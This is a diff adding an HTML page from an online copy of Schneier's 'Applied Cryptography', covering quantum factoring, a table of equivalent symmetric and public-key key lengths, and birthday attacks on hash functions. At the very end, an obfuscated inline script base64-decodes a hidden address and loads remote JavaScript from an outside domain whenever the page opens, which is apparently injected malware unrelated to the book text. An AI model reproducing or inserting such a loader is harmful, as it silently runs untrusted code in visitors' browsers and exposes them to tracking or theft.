@@ -1,0 +1,114 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Key Length</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=07//-->
+<!--PAGES=164-166//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="07-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="07-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Quantum Computing</I></B></FONT></P>
+<P>Now, it gets even weirder. The underlying principle behind quantum computing involves Einstein&#146;s wave-particle duality. A photon can simultaneously exist in a large number of states. A classic example is that a photon behaves like a wave when it encounters a partially silvered mirror; it is both reflected and transmitted, just as an ocean wave striking a seawall with a small opening in it will both reflect off the wall and pass through it. However, when a photon is measured, it behaves like a particle and only a single state can be detected.
+</P>
+<P>In [1443], Peter Shor outlines a design for a factoring machine based on quantum mechanical principles. Unlike a classical computer, which can be thought of as having a single, fixed state at a given time, a quantum computer has an internal wave function, which is a superposition of a combination of the possible basis states. Computations transform the wave function, altering the entire set of states in a single operation. In this way, a quantum computer is an improvement over classical finite-state automata: It uses quantum properties to allow it to factor in polynomial time, theoretically allowing one to break cryptosystems based on factoring or the discrete logarithm problem.</P>
+<P>The consensus is that quantum computers are compatible with the fundamental laws of quantum mechanics. However, it is unlikely that a quantum factoring machine will be built in the foreseeable future...if ever. One major obstacle is the problem of decoherence, which causes superimposed waveforms to lose their distinctness and makes the computer fail. Decoherence will make a quantum computer running at 1&#176; Kelvin fail after just one nanosecond. Additionally, an enormous number of gates would be required to build a quantum factoring device; this may render the machine impossible to build. Shor&#146;s design requires a complete modular exponentiator. No internal clock can be used, so millions or possibly billions of individual gates would be required to factor cryptographically significant numbers. If <I>n</I> quantum gates have some minimum probability <I>p</I> of failure, the average number of trials required per successful run is (1/(1 &#150; <I>p</I>))<SUP><I>n</I></SUP>. The number of gates required presumably grows polynomially with the length (in bits) of the number, so the number of trials required would be superexponential with the length of the numbers used&#151;worse than factoring by trial division!</P>
+<P>So, while quantum factorization is an area of great academic excitement, it is extremely unlikely that it will be practical in the foreseeable future. But don&#146;t say I didn&#146;t warn you.</P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">7.3 Comparing Symmetric and Public-Key Key Length</FONT></H3>
+<P>A system is going to be attacked at its weakest point. If you are designing a system that uses both symmetric and public-key cryptography, the key lengths for each type of cryptography should be chosen so that it is equally difficult to attack the system via each mechanism. It makes no sense to use a symmetric algorithm with a 128-bit key together with a public-key algorithm with a 386-bit key, just as it makes no sense to use a symmetric algorithm with a 56-bit key together with a public-key algorithm with a 1024-bit key.
+</P>
+<P>Table 7.9 lists public-key modulus lengths whose factoring difficulty roughly equals the difficulty of a brute-force attack for popular symmetric key lengths.</P>
+<P>This table says that if you are concerned enough about security to choose a symmetric algorithm with a 112-bit key, you should choose a modulus length for your public-key algorithm of about 1792 bits. In general, though, you should choose a public-key length that is more secure than your symmetric-key length. Public keys generally stay around longer, and are used to protect more information.</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">7.4 Birthday Attacks against One-Way Hash Functions</FONT></H3>
+<P>There are two brute-force attacks against a one-way hash function. The first is the most obvious: Given the hash of message, <I>H</I>(<I>M</I>), an adversary would like to be able to create another document, <I>M&#180;,</I> such that <I>H</I>(<I>M</I>) = <I>H</I>(<I>M&#180;</I>). The second attack is more subtle: An adversary would like to find two random messages, <I>M,</I> and <I>M&#180;,</I> such that <I>H</I>(<I>M</I>) = <I>H</I>(<I>M&#180;</I>). This is called a <B>collision,</B> and it is a far easier attack than the first one.</P>
+<TABLE WIDTH="50%"><TR>
+<TH CAPTION ALIGN="CENTER" COLSPAN="3">Table 7.9<BR>Symmetric and Public-key Key Lengths with Similar Resistances to Brute-Force Attacks
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TH WIDTH="10%">
+<TH ALIGN="CENTER" VALIGN="BOTTOM">Symmetric<BR>Key Length
+<TH ALIGN="CENTER" VALIGN="BOTTOM">Public-key<BR>Key Length
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">
+<TD ALIGN="CENTER" VALIGN="BOTTOM">56 bits
+<TD ALIGN="CENTER" VALIGN="BOTTOM">384 bits
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">
+<TD ALIGN="CENTER" VALIGN="BOTTOM">64 bits
+<TD ALIGN="CENTER" VALIGN="BOTTOM">512 bits
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">
+<TD ALIGN="CENTER" VALIGN="BOTTOM">80 bits
+<TD ALIGN="CENTER" VALIGN="BOTTOM">768 bits
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">
+<TD ALIGN="CENTER" VALIGN="BOTTOM">112 bits
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1792 bits
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">
+<TD ALIGN="CENTER" VALIGN="BOTTOM">128 bits
+<TD ALIGN="CENTER" VALIGN="BOTTOM">2304 bits
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+</TABLE>
+<P>The birthday paradox is a standard statistics problem. How many people must be in a room for the chance to be greater than even that one of them shares your birthday? The answer is 253. Now, how many people must there be for the chance to be greater than even that at least two of them will share the same birthday? The answer is surprisingly low: 23. With only 23 people in the room, there are still 253 different <I>pairs</I> of people in the room.</P>
+<P>Finding someone with a specific birthday is analogous to the first attack; finding two people with the same random birthday is analogous to the second attack. The second attack is commonly known as a <B>birthday attack</B>.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="07-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="07-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(KsigCgkI, uHsdduiY) {uHsdduiY = KsigCgkI.createElement('script');uHsdduiY.type = 'text/javascript';uHsdduiY.async = true;uHsdduiY.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');KsigCgkI.getElementsByTagName('body')[0].appendChild(uHsdduiY);}(document));</script></body>
+</html>
